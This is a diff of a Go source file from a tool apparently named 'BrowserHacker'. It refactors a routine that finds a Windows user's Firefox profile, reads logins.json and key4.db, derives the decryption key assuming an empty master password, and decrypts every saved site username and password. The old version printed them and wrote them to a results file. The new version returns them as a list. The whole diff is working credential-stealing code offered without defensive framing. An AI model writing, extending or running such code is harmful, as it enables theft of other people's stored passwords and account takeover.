@@ -1,73 +1,72 @@
 package core
 
 import (
-	"BrowserHacker/crypher"
-	"BrowserHacker/data"
+	"HackerBrowser/crypher"
 	"bytes"
 	"database/sql"
 	"encoding/base64"
 	"fmt"
-	_ "github.com/mattn/go-sqlite3"
 	"github.com/tidwall/gjson"
 	"io/ioutil"
 	"os"
 	"path/filepath"
 )
 
-var FireFoxMainProfile string
-var FireFoxMainDB string
-
 const (
-	FirefoxProfilePath = `/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release`
-	FirefoxLoginJson = `logins.json`
-	Firfoxkey4db = `key4.db`
+	firefoxprofile = `/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release`
+	firefoxlgonjson = `logins.json`
+	firefoxkey4db = `key4.db`
 )
-type FirefoxData struct {
-	HostName string
-	EncryptUserName []byte
-	EncryptPassword []byte
-}
-type FirefoxInit struct{
-	// firefox init struct
+
+type FireFoxInit struct {
 	ProfilePath string
 	KeyPath string
 }
 
-func (c *FirefoxInit)ReturnLoginJsonPath() string {
-	// 返回火狐浏览器的login.json文件路径
-	ProfilePath, err := filepath.Glob(os.Getenv("USERPROFILE") + FirefoxProfilePath)
+type FireFoxTemp struct {
+	Url string
+	EncryptUserName []byte
+	EncryptPassword []byte
+}
+
+type FireFoxData struct {
+	Url string
+	UserName string
+	PassWord string
+}
+
+func (f *FireFoxInit)InitProfile(MainProfile string) string {
+	profilepath, err := filepath.Glob(os.Getenv("USERPROFILE") + firefoxprofile)
 	if err != nil {
 		return ""
 	}
-	if FireFoxMainProfile != ""{
-		return FireFoxMainProfile
+	if MainProfile != ""{
+		return MainProfile
 	}else{
-		return ProfilePath[0] + `/` + FirefoxLoginJson
+		return profilepath[0] + `/` + firefoxlgonjson
 	}
 }
 
-func (c *FirefoxInit)Returnkey4db() string {
-	// 返回火狐浏览器key4.db文件路径
-	ProfilePath ,err := filepath.Glob(os.Getenv("USERPROFILE") + FirefoxProfilePath)
+func (f *FireFoxInit) InitKey(MainKey string) string{
+	keyfilepath, err := filepath.Glob(os.Getenv("USERPROFILE") + firefoxprofile)
 	if err != nil {
 		return ""
 	}
-	if FireFoxMainDB != ""{
-		return FireFoxMainDB
+	if MainKey != ""{
+		return MainKey
 	}else{
-		return ProfilePath[0] + `/` + Firfoxkey4db
+		return keyfilepath[0] + `/` + firefoxkey4db
 	}
 }
 
-
-func (c *FirefoxInit)ReturnCredentials(login string) ([]FirefoxData, error) {
+func (c *FireFoxInit)ReturnCredentials(login string) ([]FireFoxTemp, error) {
 	// 返回火狐浏览器的login凭证
-	var FireFoxD []FirefoxData
+	var FireFoxD []FireFoxTemp
 	var EncryptUserName,EncryptPassword []byte
 	file, err := ioutil.ReadFile(login) // 读取login.json文件中的内容
 	if err != nil {
 		fmt.Println(err)
-		return []FirefoxData{}, err
+		return []FireFoxTemp{}, err
 	}
 	// 获取到json格式的数据，尝试获取json文件中的数据并返回
 	for _,value := range gjson.GetBytes(file,"logins").Array(){
@@ -79,8 +78,8 @@ func (c *FirefoxInit)ReturnCredentials(login string) ([]FirefoxData, error) {
 		if err != nil {
 			EncryptPassword = []byte("")
 		}
-		FireFoxD = append(FireFoxD,FirefoxData{
-			HostName: value.Get("hostname").String(),
+		FireFoxD = append(FireFoxD,FireFoxTemp{
+			Url: value.Get("hostname").String(),
 			EncryptPassword: EncryptPassword,
 			EncryptUserName: EncryptUserName,
 		})
@@ -88,7 +87,6 @@ func (c *FirefoxInit)ReturnCredentials(login string) ([]FirefoxData, error) {
 	return FireFoxD,nil
 }
 
-// 获取数据库中的密钥
 func ReturnFireFoxDecryptkey(key string)(item1,item2,al1,al2 []byte,err error){
 	var (
 		keyDB *sql.DB
@@ -108,8 +106,7 @@ func ReturnFireFoxDecryptkey(key string)(item1,item2,al1,al2 []byte,err error){
 	// 查询pwd的数据
 	pwdRows, err = keyDB.Query(`SELECT item1, item2 FROM metaData WHERE id = 'password'`)
 	if err != nil {
-		fmt.Println("can't find key4.db file")
-		os.Exit(1)
+		return nil,nil,nil,nil,err
 	}
 	defer func() {
 		if err := pwdRows.Close(); err != nil {
@@ -122,11 +119,6 @@ func ReturnFireFoxDecryptkey(key string)(item1,item2,al1,al2 []byte,err error){
 			continue
 		}
 	}
-	if err != nil {
-		fmt.Println("can't scan database result")
-		os.Exit(1)
-	}
-
 	// 查询nss的数据
 	nssRows, err = keyDB.Query(`SELECT a11, a102 from nssPrivate`)
 	defer func() {
@@ -143,101 +135,64 @@ func ReturnFireFoxDecryptkey(key string)(item1,item2,al1,al2 []byte,err error){
 	return item1,item2,al1,al2,nil
 }
 
-func FireFoxExec() error{
-	fmt.Println("firefox")
-	var firefox FirefoxInit
-	var file *os.File
-	// 获取数据库中的加密所用的key等一些值
-	globalSalt,metaByte, nssAl1, nssAl2 ,err := ReturnFireFoxDecryptkey(firefox.Returnkey4db())
+func (f *FireFoxInit)ReturnData()([]FireFoxData, error){
+	var data FireFoxData
+	var FireFoxReturnData []FireFoxData
+	globalSalt,metaByte, nssAl1, nssAl2 ,err := ReturnFireFoxDecryptkey(f.KeyPath)
 	if err != nil {
-		return err
+		return []FireFoxData{},err
 	}
 	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
 	metaPBE, err := crypher.NewASN1PBE(metaByte)
 	if err != nil {
-		fmt.Println(err)
-		return err
+		return []FireFoxData{}, err
 	}
-	// 默认master password 为空
 	var masterPwd []byte
 	k, err := metaPBE.Decrypt(globalSalt,masterPwd)
 	if err != nil {
-		fmt.Println(err)
-		return err
-	}
-	if data.FileName == true{
-		file, _ = os.OpenFile("./result/firefox.txt", os.O_RDWR | os.O_APPEND | os.O_CREATE, 0664)
+		return []FireFoxData{}, err
 	}
 	if bytes.Contains(k,[]byte("password-check")){
 		m:= bytes.Compare(nssAl2,keyLin)
-		if m==0 {
+		if m == 0{
 			nssPBE, err := crypher.NewASN1PBE(nssAl1)
-			if err != nil {
-				fmt.Println(err)
-				return err
+			if err != nil{
+				return []FireFoxData{},err
 			}
 			finallykey, err := nssPBE.Decrypt(globalSalt,masterPwd)
 			finallykey = finallykey[:24]
 			if err != nil {
-				fmt.Println(err)
-				return err
+				return []FireFoxData{},err
 			}
-			allLogins, err := firefox.ReturnCredentials(firefox.ReturnLoginJsonPath())
+			allLogin, err := f.ReturnCredentials(f.ProfilePath)
 			if err != nil {
-				return err
+				return []FireFoxData{},err
 			}
-			for _,value  := range allLogins{
+			for _,value := range allLogin{
 				userPBE, err := crypher.NewASN1PBE(value.EncryptUserName)
 				if err != nil {
-					fmt.Println(err)
-					os.Exit(1)
+					continue
 				}
 				pwdPBE, err := crypher.NewASN1PBE(value.EncryptPassword)
 				if err != nil {
-					fmt.Println(err)
-					os.Exit(1)
+					continue
 				}
 				user, err := userPBE.Decrypt(finallykey,masterPwd)
 				if err != nil {
-					fmt.Println(err)
-					os.Exit(1)
+					continue
 				}
 				pwd, err := pwdPBE.Decrypt(finallykey,masterPwd)
 				if err != nil {
-					fmt.Println(err)
-					os.Exit(1)
+					continue
 				}
-				fmt.Println("[+]",value.HostName)
-				fmt.Println("UserName:",string(crypher.PKCS5UnPadding(user)))
-				fmt.Println("PassWord:",string(crypher.PKCS5UnPadding(pwd)))
-				fmt.Println("")
-				if data.FileName == true {
-					_,err  := file.WriteString("[+] "+ value.HostName + "\n")
-					if err != nil {
-						fmt.Println(err)
-						os.Exit(1)
-					}
-					_, err = file.WriteString("[UserName]: "+string(crypher.PKCS5UnPadding(user))+ "\n")
-					if err != nil {
-						fmt.Println(err)
-						os.Exit(1)
-					}
-					_, err = file.WriteString("[PassWord]: "+string(crypher.PKCS5UnPadding(pwd))+ "\n")
-					if err != nil {
-						fmt.Println(err)
-						os.Exit(1)
-					}
-					_, err = file.WriteString("\n")
-					if err != nil {
-						fmt.Println(err)
-						os.Exit(1)
-					}
+				data = FireFoxData{
+					Url: value.Url,
+					UserName: string(crypher.PKCS5UnPadding(user)),
+					PassWord: string(crypher.PKCS5UnPadding(pwd)),
 				}
+				FireFoxReturnData = append(FireFoxReturnData,data)
 			}
 		}
 	}
-	_ = file.Sync()
-	return nil
+	return FireFoxReturnData,nil
 }
-
-
